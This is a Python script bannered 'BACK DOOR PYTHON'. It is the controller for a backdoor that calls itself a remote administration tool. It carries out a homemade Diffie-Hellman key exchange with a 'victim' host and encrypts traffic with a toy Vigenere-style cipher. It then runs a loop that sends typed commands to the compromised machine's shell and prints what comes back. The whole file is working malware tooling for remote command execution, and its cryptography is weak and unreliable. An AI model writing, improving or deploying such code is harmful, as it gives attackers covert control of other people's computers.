#################################################################################
#██████╗  █████╗  ██████╗██╗  ██╗                     
#██╔══██╗██╔══██╗██╔════╝██║ ██╔╝                     
#██████╔╝███████║██║     █████╔╝                      
#██╔══██╗██╔══██║██║     ██╔═██╗                      
#██████╔╝██║  ██║╚██████╗██║  ██╗                     
#╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                     
#                                                     
#     ██████╗  ██████╗  ██████╗  ██████╗ ██████╗           
#     ██╔══██╗██╔═══██╗██╔═══██╗██╔═══██╗██╔══██╗          
#     ██║  ██║██║   ██║██║   ██║██║   ██║██████╔╝          
#     ██║  ██║██║   ██║██║   ██║██║   ██║██╔══██╗          
#     ██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║          
#     ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝          
#                                                     
#          ██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗
#          ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║
#          ██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
#          ██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
#          ██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
#          ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ 
################################################################################
# This is a remote administration tool                                         #
################################################################################
import socket,os,subprocess,threading,time,queue,random,re,sys,hashlib
################################################################################
# Now putting in the functions needed
################################################################################
# Now importing the modules to be used
import socket, random, hashlib
################################################################################
# Now putting in the functions needed
################################################################################
# Diffie Hellman Key Exchange Functions
def dh_phase1(p,g,cp):
    rlist = [7,11,13,17,19,23,29,31,29,37,41,43,47,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199]
    sharedexchangeG = int(g)
    sharedexchangeP = int(p)
    clientprivatenumber = int(cp)
    #clientprivatenumber = random.choices(range(20))[0]
    #cleintprivatenumberlist.apppend(clientprivatenumber)
    clientpublickey = (sharedexchangeG**clientprivatenumber) % sharedexchangeP
    #sharedsecretclient = (svrpublickey**clientprivatenumber) % sharedexchangeP
    return  clientpublickey

def dh_phase2(p,publkey,privkey):
    sharedsecretclient = (publkey**privkey) % p
    return sharedsecretclient
################################################################################
# Now Bringing the modified hybrid Vignere Cipher
def encryptstring(inputstring,password,pincode):
    '''
    TLDR - example use....
    encryptstring('plaintext','mypassword',1234)

    The plaintext entered must be a string or string object!!!
    The password you enter must be a string too
    The pincode you enter must be numbers only!!
    '''
    try:
        # Converting the input provided to binary encoded strings
        password = (str(password)).encode()
        hashedpassword = hashlib.sha256(password).hexdigest()
        inputstring = (str(inputstring)).encode()
        encryptedstring = ''.encode()    
        # Creating the pincode list using list comprehension
        pincodelist = [ i for i in str(pincode)]
        # Now setting up the rotation based upon the pin
        for d in range(len(pincodelist)):
            if d != 0:
                inputstring = encryptedstring
                encryptedstring = ''.encode()
            # Now shifting the values of the plaintext string
            for x in range(len(inputstring)):
                # Grabbing the hashed value
                hashediter = ord(hashedpassword[(x % 64)])
                # Now performing the calculation
                modulusvalue = ((inputstring[x]) + int(pincodelist[d]) + hashediter) % 127
                # Now adding the value to the encrypted string
                encryptedletter = (str(chr(modulusvalue))).encode()
                encryptedstring = encryptedstring + encryptedletter
    except:
        encryptedstring = 'There was an error, please check you input'
        pass
    return encryptedstring

def decryptstring(inputstring,password,pincode):
    '''
    TLDR - example use....
    decryptstring('plaintext','mypassword',1234)
    or
    decryptstring(plaintext,'mypassword',1234)

    The plaintext entered must be a string or binary string object!!!
    The password you enter must be a string too
    The pincode you enter must be numbers only!!
    '''
    try:
        # Converting the input provided to binary encoded strings
        password = (str(password)).encode()
        if str(type(inputstring)) != "<class 'bytes'>":
            inputstring = (str(inputstring)).encode()
        hashedpassword = hashlib.sha256(password).hexdigest()
        decryptedstring = ''.encode()
        # Creating the pincode list using list comprehension
        pincodelist = [ i for i in str(pincode)]
        # Now reversing the order of the pin list
        pincodelist = pincodelist[::-1]
        # Now setting up the rotation based upon the pin
        for d in range(len(pincodelist)):
            if d != 0:
                inputstring = decryptedstring
                decryptedstring = ''.encode()
            # Now shifting the values of the ciphertext string
            for x in range(len(inputstring)):
                # Grabbing the hashed value
                hashediter = ord(hashedpassword[(x % 64)])
                # Now performing the calculation
                charvalue = ((inputstring[x] + 127) - hashediter) - int(pincodelist[d])
                if charvalue > 127:
                    charvalue = charvalue - 127
                # Now adding the decrypt char to the decrypted string
                decryptedletter = (str(chr(charvalue))).encode()
                decryptedstring += decryptedletter
    except:
        decryptedstring = 'There was an error, please check you input'
        pass
    return decryptedstring

def pincode(password):
    pin = password[-1::-10]
    pincode = ''
    for i in pin:
        pincode += str(i)
    return int(pincode)
################################################################################
# Secure connection Function. This is the channel setup after key exchange

def securechannel(host,port,pycipherpass,encrpin):
    port = 58465
    sec = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sec.bind(('0.0.0.0',443))
    sec.connect((host,port))
    command = input('CMD: ')
    # This is the command line that is presented after connect to the client
    # The default shell is the cmd shell. This is not an interactive session
    # so commands will have to be entered in using the full path of the EXEs
    while True:
        message = encryptstring(command,pycipherpass,encrpin)
        message = message.decode()
        sec.send(bytes(str(message), 'UTF-8'))
        data = sec.recv(102400)
        output = data.decode()
        output = decryptstring(output,pycipherpass,encrpin)
        output = output.decode()
        print(output)
        command = input('CMD: ')
        while command == '':
            command = input('CMD: ') 
        if command == 'exit':
            sec.shutdown(1)
            break
        message = command
    sec.close()
################################################################################
# Connection Initiation. This function starts the connect and exchanges the keys
# using diffie hellman

def connectestablish(host,port):
    # Setting up the connection
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0',port))
    s.connect((host,58365))
    # Now starting the exchange of keys
    s.send(bytes('hellofriend', 'UTF-8'))
    data = s.recv(102400)
    p = str(data)
    p = (p.strip("b'[")).strip(']')
    p = p.split(', ')
    # Now setting up the primes and base
    s.send(bytes('Nowawaiting G', 'UTF-8'))
    data = s.recv(102400)
    g = str(data)
    g = (g.strip("b'[")).strip(']')
    g = g.split(', ')
    clientpublickey = []
    clientprivatenumberlist = []
    rlist = [7,11,13,17,19,23,29,31,29,37,41,43,47,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199]
    # Now generating the publick keys to send to the victim
    for i in range(50):
        clientprivatenumberlist.append((random.choices(rlist)[0]))
        cp = clientprivatenumberlist[i]
        publickey = dh_phase1(p[i],g[i],cp)
        clientpublickey.append(publickey)
    clientpublickey = 'publickeys:' + str(clientpublickey)
    s.send(bytes(clientpublickey, 'UTF-8'))
    data = s.recv(102400)
    serverpublickeys = str(data)
    serverpublickeys = (serverpublickeys.strip("b'[")).strip(']')
    serverpublickeys = serverpublickeys.split(', ')
    # Now generating the password based on the public keys recieved from the other server
    password = []
    for i in range(50):
        pnumber = p[i]
        pbkey = serverpublickeys[i]
        pvkey = clientprivatenumberlist[i]
        password.append(dh_phase2(int(pnumber),int(pbkey),int(pvkey)))
    s.send(bytes('MoveTo443', 'UTF-8'))
    s.close()
    pycipherpass = ''
    for i in password:
        pycipherpass += str(i) 
    encrpin = pincode(password)
    return pycipherpass, encrpin
    
################################################################################
# Now running the commands within the script to start the back door
print("""
██████╗  █████╗  ██████╗██╗  ██╗                     
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝                     
██████╔╝███████║██║     █████╔╝                      
██╔══██╗██╔══██║██║     ██╔═██╗                      
██████╔╝██║  ██║╚██████╗██║  ██╗                     
╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                     
                                                     
██████╗  ██████╗  ██████╗  ██████╗ ██████╗           
██╔══██╗██╔═══██╗██╔═══██╗██╔═══██╗██╔══██╗          
██║  ██║██║   ██║██║   ██║██║   ██║██████╔╝          
██║  ██║██║   ██║██║   ██║██║   ██║██╔══██╗          
██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║          
╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝          
                                                     
██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗
██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║
██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
Enter the IP of the machine you wish to remotely administer

""")
host = input('HOST OR IP ADDRESS: ')
keys = connectestablish(host,80)
securechannel(host,58465,keys[0],keys[1])

################################################################################
#END
